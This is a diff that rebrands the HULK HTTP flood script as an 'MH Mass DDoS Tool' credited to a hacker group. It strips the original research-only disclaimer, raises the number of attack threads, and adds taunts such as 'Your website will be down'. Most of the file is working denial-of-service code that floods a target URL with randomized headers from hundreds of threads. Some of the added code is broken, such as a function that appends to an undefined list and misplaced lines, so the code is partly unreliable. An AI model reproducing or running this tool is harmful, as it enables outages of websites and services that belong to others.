@@ -1,34 +1,21 @@
-# Infi-Zeal Technologies
-# Regards,
-# Hardeep Singh
-
-# ----------------------------------------------------------------------------------------------
-# HULK - HTTP Unbearable Load King
-#
-# this tool is a dos tool that is meant to put heavy load on HTTP servers in order to bring them
-# to their knees by exhausting the resource pool, its is meant for research purposes only
-# and any malicious usage of this tool is prohibited.
-#
-# author :  Barry Shteiman , version 1.0
-# ----------------------------------------------------------------------------------------------
 import urllib2
 import sys
 import threading
 import random
 import re
 
-#global params
-url=''
-host=''
-headers_useragents=[]
-headers_referers=[]
-request_counter=0
-flag=0
-safe=0
+#global params                                                                                       
+url=''                                                                                              ###############################
+host=''                                                                                             #~~~~Created By M1N3~~~~#
+headers_useragents=[]                                                                               
+headers_referers=[]                                                                                 
+request_counter=0                                                                                   
+flag=0                                                                                              
+safe=0                                                                                              ###############################
 
 def inc_counter():
 	global request_counter
-	request_counter+=1
+	request_counter+=45
 
 def set_flag(val):
 	global flag
@@ -41,11 +28,11 @@ def set_safe():
 # generates a user agent array
 def useragent_list():
 	global headers_useragents
-	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) BlackHawk/1.0.195.0 Chrome/127.0.0.1 Safari/62439616.534')
 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
+	headers_useragents.append('Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)')
+	headers_useragents.append('Mozilla/5.0 (Windows NT 6.1; rv:26.0) Gecko/20100101 Firefox/26.0 IceDragon/26.0.0.2')
 	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
 	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
 	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
@@ -58,9 +45,34 @@ def useragent_list():
 # generates a referer array
 def referer_list():
 	global headers_referers
-	headers_referers.append('http://www.google.com/?q=')
-	headers_referers.append('http://www.usatoday.com/search/results?q=')
-	headers_referers.append('http://engadget.search.aol.com/search?q=')
+	headers_referers.append('http://www.google.com/?q=')                                       ############################
+	headers_referers.append('http://www.usatoday.com/search/results?q=')                       #Pre-configured            #
+	headers_referers.append('http://engadget.search.aol.com/search?q=')                        #Botnets                   #
+	headers_referers.append('http://www.google.com/?q=')                                       #Infected's Websites       #
+	headers_referers.append('http://www.usatoday.com/search/results?q=')                       #Best's Shells Only        #
+	headers_referers.append('http://engadget.search.aol.com/search?q=')                        #All uploaded by M1N3#
+	headers_referers.append('http://www.bing.com/search?q=')                                   #From M Hackers       #
+	headers_referers.append('http://search.yahoo.com/search?p=')                               ############################
+	headers_referers.append('http://www.ask.com/web?q=')
+	headers_referers.append('http://search.lycos.com/web/?q=')
+	headers_referers.append('http://busca.uol.com.br/web/?q=')
+	headers_referers.append('http://us.yhs4.search.yahoo.com/yhs/search?p=')
+	headers_referers.append('http://www.dmoz.org/search/search?q=')
+	headers_referers.append('http://www.baidu.com.br/s?usm=1&rn=100&wd=')
+	headers_referers.append('http://yandex.ru/yandsearch?text=')
+	headers_referers.append('http://www.zhongsou.com/third?w=')
+	headers_referers.append('http://hksearch.timway.com/search.php?query=')
+	headers_referers.append('http://find.ezilon.com/search.php?q=')
+	headers_referers.append('http://www.sogou.com/web?query=')
+	headers_referers.append('http://api.duckduckgo.com/html/?q=')
+	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
+
+# generates a Keyword list	
+def keyword_list():
+        global keyword_top
+        keyword_top.append('M Hackers')
+
+
 	headers_referers.append('http://' + host + '/')
 	return(headers_referers)
 	
@@ -68,15 +80,35 @@ def referer_list():
 def buildblock(size):
 	out_str = ''
 	for i in range(0, size):
-		a = random.randint(65, 90)
+		a = random.randint(65, 160)
 		out_str += chr(a)
 	return(out_str)
 
 def usage():
-	print '---------------------------------------------------'
-	print 'USAGE: python hulk.py <url>'
-	print 'you can add "safe" after url, to autoshut after dos'
-	print '---------------------------------------------------'
+	print 'MH Mass DDoS Tool created by M1N3'
+	print 'M Hackers Facebook Page: https://www.facebook.com/M-Hackers-523388257837691/'
+	print 'Usage: MH.py (url)'
+	print 'Example: MH.py http://hackthissite.com/'
+	print "\a"
+print \
+"""                                                       
+  *****           *****
+  ******         ******
+  *** ***       *** ***
+  ***  ***     ***  ***
+  ***   ***   ***   ***
+  ***    *** ***    ***
+  ***      ***      ***
+  ***       *       ***
+  ***               ***
+  ***               ***
+  ***               ***
+  ***               ***
+
+--------M HACKERS--------
+_________________________
+                                                
+"""
 
 	
 #http request
@@ -92,8 +124,8 @@ def httpcall(url):
 	request.add_header('User-Agent', random.choice(headers_useragents))
 	request.add_header('Cache-Control', 'no-cache')
 	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
-	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
-	request.add_header('Keep-Alive', random.randint(110,120))
+	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(50,100)))
+	request.add_header('Keep-Alive', random.randint(110,160))
 	request.add_header('Connection', 'keep-alive')
 	request.add_header('Host',host)
 	try:
@@ -101,7 +133,12 @@ def httpcall(url):
 	except urllib2.HTTPError, e:
 			#print e.code
 			set_flag(1)
-			print 'Response Code 500'
+            
+ 			print '                                                                    '
+ 			print '***** We Are M Hackers *****'
+ 			print '***** Your website will be down *****'
+ 			print '                                                                    '
+                                                         
 			code=500
 	except urllib2.URLError, e:
 			#print e.reason
@@ -128,11 +165,11 @@ class MonitorThread(threading.Thread):
 	def run(self):
 		previous=request_counter
 		while flag==0:
-			if (previous+100<request_counter) & (previous<>request_counter):
-				print "%d Requests Sent" % (request_counter)
+			if (previous+150<request_counter) & (previous<>request_counter):
+				print "#~~~>MH DDoS Attack's Sended: %d Sending more<~~~#" % (request_counter)
 				previous=request_counter
 		if flag==2:
-			print "\n-- HULK Attack Finished --"
+			print "\n ~>Stopping the mass DDoS Attack<~"
 
 #execute 
 if len(sys.argv) < 2:
@@ -143,7 +180,8 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print "-- HULK Attack Started --"
+		print "Starting the MH DDoS Tool"
+		print "Created By M1N3"
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
@@ -152,7 +190,7 @@ else:
 			url = url + "/"
 		m = re.search('http\://([^/]*)/?.*', url)
 		host = m.group(1)
-		for i in range(500):
+		for i in range(700):
 			t = HTTPThread()
 			t.start()
 		t = MonitorThread()
